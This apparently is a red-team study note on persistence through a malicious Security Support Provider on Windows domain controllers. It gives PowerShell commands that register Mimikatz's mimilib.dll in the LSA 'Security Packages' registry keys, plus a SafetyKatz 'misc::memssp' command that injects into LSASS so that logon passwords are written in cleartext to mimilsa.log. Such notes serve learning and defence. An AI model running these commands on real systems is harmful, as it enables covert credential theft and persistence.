SSP - Security Support Provider
- DLL that allows for an application to obtain an authentication connection
- some SSP packages used by Microsoft are
	- NTLM
	- Kerberos
	- Wdigest
	- CredSSP
- Mimikatz provides a custom SSP - mimilib.dll
	- logs local logons, service account and machine account passwords in cleartext


# Using mimilib.dll

can use it in two ways
- drop mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig
```
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'

$packages += "mimilib"

Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages

Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```

- using mimikatz, inject into LSASS (not super stable with Server 2019 and 2022)
	- won't crash the DC, but won't work every time
`SafetyKatz.exe -Command '"misc::memssp"'`

all local logons on the DC are logged to C:\Windows\system32\mimilsa.log
![[assets/Pasted image 20260204062215.png]]


two main issues with this method
- lowers the security posture of environment since it logs all logins
- need DA to set up the persistence, and also need DA to use the persistence
	- with other methods, you need DA for setup, but not for use

